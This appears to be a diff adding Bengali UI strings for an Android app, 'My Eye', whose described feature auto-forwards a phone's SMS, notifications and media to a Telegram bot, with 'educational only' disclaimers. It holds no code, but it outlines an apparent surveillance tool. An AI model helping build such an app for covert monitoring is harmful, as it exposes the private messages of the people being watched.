@@ -1,0 +1,53 @@
+<resources>
+    <!-- App Name -->
+    <string name="app_name">My Eye</string>
+    
+    <!-- Main Activity -->
+    <string name="monitoring_off">মনিটরিং বন্ধ আছে</string>
+    <string name="monitoring_on">মনিটরিং চালু আছে</string>
+    <string name="monitoring_status">মনিটরিং স্ট্যাটাস</string>
+    <string name="switch_label">মনিটরিং চালু করুন</string>
+    <string name="monitoring_desc">এই ফিচার চালু করলে এসএমএস, নোটিফিকেশন এবং মিডিয়া অটোমেটিকভাবে টেলিগ্রামে ফরওয়ার্ড হবে।</string>
+    <string name="permissions">পারমিশন</string>
+    <string name="permissions_desc">অ্যাপটি কাজ করার জন্য নিচের পারমিশনগুলো প্রয়োজন:</string>
+    <string name="grant_permissions">পারমিশন দিন</string>
+    <string name="settings">সেটিংস</string>
+    <string name="developer">ডেভেলপার</string>
+    <string name="educational_note">⚠️ এই অ্যাপটি শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে তৈরি করা হয়েছে</string>
+    
+    <!-- Developer Activity -->
+    <string name="developer_profile">ডেভেলপার প্রোফাইল</string>
+    <string name="about_developer">ডেভেলপার সম্পর্কে</string>
+    <string name="app_purpose">অ্যাপের উদ্দেশ্য</string>
+    <string name="visit_website">ওয়েবসাইট ভিজিট করুন</string>
+    <string name="back">ফিরে যান</string>
+    <string name="educational_only">শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে</string>
+    
+    <!-- Settings Activity -->
+    <string name="telegram_settings">টেলিগ্রাম সেটিংস</string>
+    <string name="bot_token">বট টোকেন</string>
+    <string name="enter_bot_token">বট টোকেন লিখুন...</string>
+    <string name="chat_id">চ্যাট আইডি</string>
+    <string name="enter_chat_id">চ্যাট আইডি লিখুন...</string>
+    <string name="telegram_instructions">১. Telegram-এ @BotFather খুঁজুন\n২. /newbot কমান্ড দিন\n৩. নতুন বট তৈরি করুন\n৪. টোকেন কপি করে এখানে পেস্ট করুন\n৫. চ্যাট আইডি পেতে @userinfobot-এ মেসেজ দিন</string>
+    <string name="data_management">ডেটা ম্যানেজমেন্ট</string>
+    <string name="clear_all_logs">সমস্ত লগ ডিলিট করুন</string>
+    <string name="clear_logs_warning">সতর্কতা: এটি সব এসএমএস এবং মিডিয়া লগ ডিলিট করে দেবে</string>
+    <string name="save_settings">সেটিংস সেভ করুন</string>
+    <string name="back_to_main">মেইন মেনুতে ফিরুন</string>
+    <string name="settings_warning">⚠️ বৈধ উদ্দেশ্যে ব্যবহার করুন</string>
+    
+    <!-- SMS Log Item -->
+    <string name="sms_icon">এসএমএস আইকন</string>
+    <string name="status_icon">স্ট্যাটাস আইকন</string>
+    <string name="view_full">সম্পূর্ণ দেখুন</string>
+    <string name="share">শেয়ার</string>
+    
+    <!-- Common -->
+    <string name="app_icon">অ্যাপ আইকন</string>
+    <string name="ok">ঠিক আছে</string>
+    <string name="cancel">বাতিল</string>
+    <string name="loading">লোড হচ্ছে...</string>
+    <string name="error">ত্রুটি</string>
+    <string name="success">সফল</string>
+</resources>
